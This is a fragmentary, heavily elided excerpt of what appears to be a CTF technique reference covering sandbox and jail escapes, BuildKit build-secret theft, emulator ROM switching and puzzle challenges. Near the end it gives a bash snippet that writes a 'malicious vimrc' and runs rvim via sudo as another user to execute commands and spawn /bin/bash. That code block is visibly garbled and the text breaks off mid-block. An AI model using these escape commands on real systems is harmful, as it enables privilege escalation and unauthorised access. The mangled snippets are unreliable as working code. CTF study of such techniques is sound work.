# Preserved source: games-and-vms-3.md
...
- [Benford's Law Frequency Distribution Bypass]
- [Parallel Connection Oracle Relay]
- [Nonogram Solver to QR Code Pipeline]
- [100 Prisoners Problem / Cycle-Following Strategy]
- [C Code Jail Escape via Emoji Identifiers and Gadget Embedding]
...
- [rvim Jail Escape via Custom vimrc with Python3 Execution]
- [Restricted vim Escape via CTRL-W F and netrw File Browser]
- [Taint Analysis Bypass in Custom Language via Type Coercion]
- [Shredded Document Pixel-Edge Reassembly Under Time Pressure]
...
**Pattern:** Server presents a multi-phase challenge combining cryptography, game theory, and commitment-reveal protocols.
...
**Pattern:** In emulator debuggers, the `/load` command may replace only the ROM program while preserving CPU state (registers, RAM, program counter). By switching between ROMs at specific PC values, you can execute arbitrary instruction sequences using instructions from different programs.
...
- the prompt mentions "ROM switching", "hot swap", or "state preservation"
...
The classic 100 prisoners problem appears in challenges as an "impossible" probability game:
...
**Pattern:** Challenge accepts a Dockerfile and builds it. The build environment uses Docker BuildKit with `-mount=type=secret,id=flag` to inject secrets during build. An exposed BuildKit daemon (tcp://127.0.0.1:1234) allows submitting nested build requests that mount and read the secret.
...
**When to recognize:** Artifact set provides a Dockerfile upload/build service. Look for BuildKit features (`-mount=type=secret`, `BUILDKIT_INLINE_CACHE`, `# syntax=` directives). Check if the build daemon is accessible from within built containers.
...
let incr = (fn (bit: int) => (leaked:= !leaked + bit):> private unit):> private (int -> private unit) in
...
## References
- public source 2026 "The Architect's Gambit": Multi-phase AES + HMAC + GF(256) Nim
- "wromwarp": Emulator ROM-switching state preservation
...
- 8: 15-puzzle solvability as bit encoder
- Midnight Flag 2026: C code jail escape via emoji identifiers
- "builds-as-a-service": BuildKit daemon build secret exploitation
- SunshineCTF 2016: Levenshtein distance oracle attack
- : Taint analysis bypass via type coercion in custom language
- : Shredded document pixel-edge reassembly
...
**Pattern:** `rvim` (restricted vim) blocks `:!`, `:shell`, and similar command execution. However, `rvim -u custom_vimrc` loads a user-specified vimrc file that executes before restrictions are fully applied. If `rvim` is run via `sudo -u targetuser`, the vimrc can contain `:python3 import os; os.system("cmd")` to execute commands as the target user.

```bash
# Create malicious vimrc
cat > /tmp/evil_vimrc << 'EOF':python3 import os; os.system:q!
EOF

# Launch rvim with custom vimrc as target user
sudo -u secretuser rvim -u /tmp/evil_vimrc /dev/null

# Alternative: interactive escape once inside rvim:py3 import os; os.system("/bin/bash")
```
...
```text
# Keystrokes (no ex commands required):   — blocked
